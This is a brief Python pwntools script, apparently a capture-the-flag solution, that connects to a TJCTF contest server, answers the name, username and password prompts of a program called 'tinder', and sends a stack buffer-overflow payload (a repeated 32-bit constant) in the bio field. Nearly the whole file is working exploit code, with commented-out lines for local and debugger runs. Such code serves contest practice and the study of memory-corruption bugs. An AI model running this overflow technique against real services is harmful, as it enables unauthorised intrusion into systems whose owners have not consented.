#!/usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

def solve():

    payload = p32(0xc0d3d00d) * 90

    io = remote('p1.tjctf.org', 8002)
    #io = gdb.debug('./tinder', '''break *0x80488e4''')
    #io = process('./tinder')

    print(io.recvuntil('Name:').strip())
    io.sendline('Hacker')
    print(io.recvuntil('Username:').strip())
    io.sendline('Hacker')
    print(io.recvuntil('Password:').strip())
    io.sendline('Hacker')
    print(io.recvuntil('Tinder Bio:').strip())
    io.sendline(payload)
    print(io.recvall())


if __name__ == '__main__':
    solve()
